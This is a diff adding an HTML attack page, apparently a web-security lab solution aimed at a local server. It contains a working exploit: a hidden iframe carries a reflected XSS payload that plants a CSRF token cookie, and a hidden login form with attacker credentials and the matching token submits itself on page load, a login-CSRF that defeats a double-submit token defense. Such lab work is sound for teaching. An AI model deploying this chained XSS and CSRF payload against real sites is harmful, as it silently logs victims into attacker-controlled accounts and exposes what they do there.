@@ -1,0 +1,22 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta  charset="utf-8"/>
+</head>
+<body>
+<iframe name="frame_hidden" src="http://127.0.0.1:8080/search?q=<script>document.cookie='csrf_token=5d178f0683c38debc0fe0a05da1192e8'</script>&csrfdefense=1&xssdefense=0"></iframe>
+<form name = "form_1" action="http://127.0.0.1:8080/login?csrfdefense=1&xssdefense=0" method = "POST" type = "hidden">
+  <input  type = "hidden"  name="username"  value ="attacker">
+  <input  type = "hidden"  name="password" value ="l33th4x">
+  <input type="hidden" name="csrf_token" value="5d178f0683c38debc0fe0a05da1192e8">
+</form >
+<script type="text/javascript">
+  window.onload = function(){
+    form_1.submit();
+  }
+</script>
+
+</body>
+</html>
